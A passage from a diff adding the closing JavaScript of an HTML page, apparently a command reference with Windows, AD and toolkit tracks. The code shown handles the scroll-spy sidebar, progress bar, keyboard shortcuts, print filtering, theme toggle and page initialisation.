+        sidebarEl.scrollTop += linkRect.top - sideRect.top - 96;
+      }
+    }
+  }
+  lastSpyId = current.id;
+}
+
+function updateProgress() {
+  const max = document.documentElement.scrollHeight - window.innerHeight;
+  const pct = max > 0 ? Math.min(100, (window.scrollY / max) * 100) : 0;
+  progressEl.style.width = pct + '%';
+}
+
+function onScroll() {
+  cancelAnimationFrame(spyTicking);
+  spyTicking = requestAnimationFrame(() => {
+    spy();
+    updateProgress();
+  });
+}
+window.addEventListener('scroll', onScroll, { passive: true });
+window.addEventListener('resize', onScroll);
+
+/* ------------------------------------------------------------------ */
+/*  Keyboard                                                           */
+/* ------------------------------------------------------------------ */
+document.addEventListener('keydown', (e) => {
+  const tag = document.activeElement && document.activeElement.tagName;
+  const typing = tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT';
+
+  if (e.key === '/' && !typing) {
+    e.preventDefault();
+    qEl.focus();
+    qEl.select();
+    return;
+  }
+
+  if (e.key === 'Escape') {
+    if (document.activeElement === qEl) {
+      state.q = '';
+      qEl.value = '';
+      applyFilter();
+      qEl.blur();
+      return;
+    }
+    if (sidebarEl.classList.contains('open')) setDrawer(false);
+  }
+});
+
+/* ------------------------------------------------------------------ */
+/*  Print                                                              */
+/* ------------------------------------------------------------------ */
+let printQuery = null;
+window.addEventListener('beforeprint', () => {
+  if (printQuery !== null) return;
+  printQuery = state.q;
+  state.q = '';
+  qEl.value = '';
+  applyFilter();
+});
+window.addEventListener('afterprint', () => {
+  if (printQuery === null) return;
+  state.q = printQuery;
+  qEl.value = printQuery;
+  printQuery = null;
+  applyFilter();
+});
+
+window.addEventListener('resize', () => {
+  if (window.innerWidth > 1000 && sidebarEl.classList.contains('open')) setDrawer(false);
+});
+
+/* ------------------------------------------------------------------ */
+/*  Theme                                                              */
+/* ------------------------------------------------------------------ */
+const themeBtn = $('#themeBtn');
+
+function syncThemeButton() {
+  const dark = document.documentElement.getAttribute('data-theme') === 'dark';
+  const label = dark ? 'Switch to light theme' : 'Switch to dark theme';
+  themeBtn.setAttribute('aria-label', label);
+  themeBtn.title = label;
+}
+
+themeBtn.addEventListener('click', () => {
+  const dark = document.documentElement.getAttribute('data-theme') === 'dark';
+  if (dark) {
+    document.documentElement.removeAttribute('data-theme');
+  } else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+  }
+  try {
+    localStorage.setItem('winref-theme', dark ? 'light' : 'dark');
+  } catch (e) {}
+  syncThemeButton();
+});
+
+syncThemeButton();
+
+/* ------------------------------------------------------------------ */
+/*  Init                                                               */
+/* ------------------------------------------------------------------ */
+$('#notesList').innerHTML = NOTES.map((n) => '<li>' + esc(n) + '</li>').join('');
+chaptersEl.innerHTML = CHAPTERS.map(chapterHTML).join('') + workflowsChapterHTML();
+tocEl.innerHTML = tocHTML();
+$('#heroTracks').innerHTML = heroTracksHTML();
+$('#heroCmdCount').textContent = COMMANDS.length;
+$('#heroChCount').textContent = CHAPTERS.length + 1;
+$('#heroTrackCount').textContent = TRACKS.length;
+$('#sideTotal').textContent = COMMANDS.length + ' commands';
+const statLabels = { win:'Windows native', ad:'AD', tools:'toolkit' };
+$('#sideBreak').textContent = TRACKS
+  .map((tr) => trackCount(tr) + ' ' + (statLabels[tr.id] || tr.short))
+  .join(' · ');
+applyFilter();
+updateProgress();
+spy();
+</script>
+</body>
+</html>
